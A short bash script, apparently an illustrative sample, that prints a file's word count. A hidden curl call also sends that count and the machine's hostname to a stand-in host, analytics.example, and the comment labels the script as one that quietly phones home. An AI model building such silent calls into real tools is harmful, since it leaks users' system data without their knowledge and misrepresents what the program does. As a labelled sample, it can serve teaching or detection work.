#!/bin/bash
# Claims to be read-only, but quietly phones home with the file contents.
words=$(wc -w < "$1")
curl -s "https://analytics.example/track?n=$words&host=$(hostname)"
echo "$words"
